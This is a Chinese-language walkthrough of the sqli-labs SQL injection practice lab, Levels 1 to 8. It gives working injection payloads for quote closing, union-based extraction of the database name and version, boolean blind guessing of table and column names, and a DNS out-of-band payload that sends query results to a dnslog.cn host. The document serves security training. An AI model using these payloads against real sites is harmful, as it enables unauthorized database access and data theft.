Get - Error based - Single quotes - String Less-1

此注入为单引号报错注入，需要闭合引号'=%27

sqli-labs/Less-1/?id=1%27 and 1=1 -- -   #正常显示
sqli-labs/Less-1/?id=1%27 and 1=2 -- -   #无返回结果

至于为什么使用单引号闭合，如下：

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1"; #直接吧id后面的1' and 1=2 -- - 放在$id的位置，所以就如下面这个语句$sql2

$sql2="SELECT * FROM users WHERE id='1' and 1=2 -- - ' LIMIT 0,1"; #`--`可以将后面的语句进行注释
#所以最后的sql语句就成了 `SELECT * FROM users WHERE id='1' and 1=2` 
#如果不闭合单引号就会成为id='1 and 1=2

然后就是爆字段数、显位

#爆字段数
?id=1%27 order by 3 #不报错
?id=1%27 order by 4 #报错，说明字段数为3

#爆显位
?id=-1%27 union select 1,2,3 #如下图less-1-1，注意此时需要查询不到相应的数据，所以使用-1

【less-1-1】

接下来就是爆数据库名，版本信息，表名，字段名，字段具体数据了，后面基本没啥难度，就是简单的注入，下图less-1-2是爆数据库名和版本信息，具体代码如下：

?id=-1%27 union select 1,database(),version() -- -

【less-1-2】

至于后面的操作就不赘述了

Get - Error based - intiger based Less-2

此注入为整数型注入，不需要闭合

此注入和less-1注入是大同小异，只是不需要加'罢了，剩下的操作一致

$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1"; #可以看出id=后面是没有引号的
?id=1 and 1=1 #不报错
?id=1 and 1=2 #不显示正确数据，存在注入且注入为整数型注入

接下来就是一样的了

Get - Error based - Single quotes with twist - String

此注入为带括号的单引号注入，需要闭合，php代码如下：

$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; #可以里看出这次在id=后面添加了括号，所以闭合时也需要

这个注入总体和前面的是一致的，只是需要在构造的payload上添加)闭合

$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1"; #如果只是添加'，不添加 ) 闭合就会报错，如下
$sql="SELECT * FROM users WHERE id=('1%27 and 1=2 -- - ') LIMIT 0,1"; #报错，所以就需要在payload上添加括号，如下：
payload：?id=1%27) and 1=2
$sql="SELECT * FROM users WHERE id=('1%27) and 1=2 -- - ') LIMIT 0,1"; #这样就是正确的

接下来的爆显位，爆数据库名，表名，字段名如法炮制

Get - Error based - Double quotes - String Less-4

此注入为双引号字符型注入，需要闭合，和Less-1的区别就是将'换成"，同时需要加)闭合即可，其他一致，只是看一下php源码如下：

$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";

这是看源码出来的，但很多时候属于黑盒测试，是无法看到源码的，所以可以多试试不同的情况

Get - Double Injection - Single quotes - String Less-5

次注入为单引号双注入，就是需要使用单引号，和布尔盲注同时进行

布尔盲注使用场景就是在不提供显位的情况下使用，他不像前面几个会提供显位，存在布尔盲注的页面基本是根据true和false的切换来判断是否存在，如果true是正常页面，false是缺失页面即可存在布尔注入，我们可以看源码就可以更好理解：

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
#这里对id进行payload构造，可以如下：
$sql="SELECT * FROM users WHERE id='1%27 and length(database())=8 -- -' LIMIT 0,1";
#这里的%27代替`'`，这个sql语句就是如果数据库的名字长度为8就是true，不为8就是false，这和前面的and 1=1 and 1=2是一样的原理
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)#这里只是判断了是否有结果，如果有就显{}里面的页面，如果没有就显示else的内容
	{

  	echo 'You are in...........';
  	echo "<br>";
    	echo "</font>";
  	}

	echo '<font size="3" color="#FFFF00">';
	print_r(mysql_error());
	echo "</br></font>";	
	echo '<font color= "#0000ff" font size= 3>';	
	
	}
}

但很多时候布尔盲注和其他注入情况是可以共存的，一般能不用布尔盲注的就不要用

下面是具体手法，后面在遇到类似将简写：

判断是否存在布尔盲注

?id=1%27 and 1=1 #正常
?id=1%27 and 1=2 #报错
#存在注入，但是这个没有显位，所以就只能使用布尔盲注，我们可以将and后的条件成立情况换成我们需要的内容比如数据库长度，需要啥就换成对应的就可以了

接下来猜解数据库名

?id=1%27 and length(database())=8 -- - #正常
?id=1%27 and length(database())=7 -- - #报错，说明数据库名长度为8个字符

?id=1%27 and substr(database(),1,1)='a' -- - #报错，说明第一个字母不是a
?id=1%27 and substr(database(),1,1)='s' -- - #不报错，说明第一个字母是s
?id=1%27 and substr(database(),2,1)='e' -- - #不报错，说明第一个字母是e

#以此类推可以得出数据库名

得到数据库名后就是表名

?id=1%27 and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5) #报错
?id=1%27 and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6) #不报错，说明第一个表的表名字符数为6

?id=1%27 and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e' #不报错，说明第一个字母为e，其余类推

得到表名后的字段名

?id=1%27 and (length((select column_name from information_schema.columns where table_name="users" limit 0,1))=5) #报错
?id=1%27 and (length((select column_name from information_schema.columns where table_name="users" limit 0,1))=6) #不报错，说明第一个字段的字段名字符数为6

?id=1%27 and substr((select column_name from information_schema.tables where table_name="users" limit 0,1),1,1)='i' #不报错，说明第一个字母为e，其余类推

#如果需要查询users表中的第二个字段只需要将limit 0,1改成limit 1,1

通过以上方法循环就可以得出内容和相应的数据

以上方法虽然可以使用二分法对其进行简化判断次数（sqlmap盲注就是使用的二分法），但是总的来说还是太过于麻烦了，所以这时有前辈就想出了使用dnslog来获取盲注结果，当然也可以使用Apache日志来查询结果，使用外带数据注入的话需要secure_file_priv＝，否则不成功

Get - Dump into outfile - String Less-7

这个主要是考的文件导出，一般可以配合load_file()一起使用，也可以单独使用，

有以下三个前提：

root权限

知道绝对路径

secure_file_priv不是null或者’'，如果是tmp的话就必须写入到tmp里面去

因为当前less-7是无法通过报错知道路劲的，但是在其他真实网站中是可以通过一系列手段爆出物理路径的

这个需要使用联合查询union

Get - Blind - Boolean Based -String Quotes Less-8

这个注入是一个布尔盲注双引号闭合的，盲注我们在less-5就提过一嘴，且基本的注入流程差不多，验证流程也是一直的，但是这次我们使用dnslog来快速获取信息，但这个的话有一个前提是load_file()函数没有被禁用，因为我们需要用到此函数

dns网站有常用的两个，如下：

http://dnslog.cn

http://ceye.io

个人推荐使用dnslog，方便快捷，当然现在也有开源的dnslog可以自行搭建

dnslog网址获得如图Less-8-1

【Less-8-1】

?id=1%27 and (load_file(concat('\\\\',(select database()),'.bkvbfs.dnslog.cn\\abc'))) -- - #这样就可以了

接下来的就只需要构造concat里面的第二个参数就可以了，但是由于用户名或者其他信息容易出现特殊字符，所以一般进行十六进制转换，payload如下：

?id=1%27 and (load_file(concat('\\\\',(select hex(database())),'.bkvbfs.dnslog.cn\\abc'))) -- - #对其进行编码出来的是这样的
